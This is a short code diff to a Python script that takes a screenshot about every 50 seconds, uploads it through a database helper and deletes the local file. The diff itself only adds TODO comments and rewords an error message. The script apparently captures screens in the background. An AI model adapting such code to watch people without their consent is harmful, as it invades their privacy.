@@ -10,7 +10,7 @@ comname = getpass.getuser()
 
 def remaining_images_checker():
     print('in remaining images checker function')
-    files = os.listdir(comname)
+    files = os.listdir(comname) #TODO
     print(len(files))
     if len(files) != 0:
         for file in files:
@@ -29,7 +29,7 @@ def remaining_images_checker():
         
 
 def ss_taker():
-    if not os.path.exists(f'{comname}'):
+    if not os.path.exists(f'{comname}'): #TODO
         os.mkdir(comname)
     print('ss_taker function called')
     try:
@@ -39,7 +39,7 @@ def ss_taker():
         dbfile.upload_images(imgpath=f'{comname}/{date}.png')
         os.remove(f'{comname}/{date}.png')
     except:
-        print('some exception occured')
+        print('some exception occured while sending ss')
         time.sleep(2)
         ss_taker() 
     timer = Timer(interval=50, function = ss_taker)
